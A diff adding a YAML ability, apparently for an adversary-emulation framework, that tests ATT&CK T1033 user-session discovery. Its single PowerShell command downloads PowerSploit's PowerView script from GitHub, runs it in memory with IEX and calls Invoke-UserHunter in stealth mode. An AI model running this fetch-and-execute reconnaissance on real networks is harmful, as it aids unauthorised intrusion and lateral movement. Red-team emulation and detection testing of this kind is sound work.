@@ -1,0 +1,20 @@
+---
+- id: cfcf66cc85109ad2ebdb301d619fa41f
+  name: Find computers where user has session - Stealth mode (PowerView)
+  description: Find existing user session on other computers. Upon execution, information
+    about any sessions discovered will be displayed.
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: System Owner/User Discovery
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
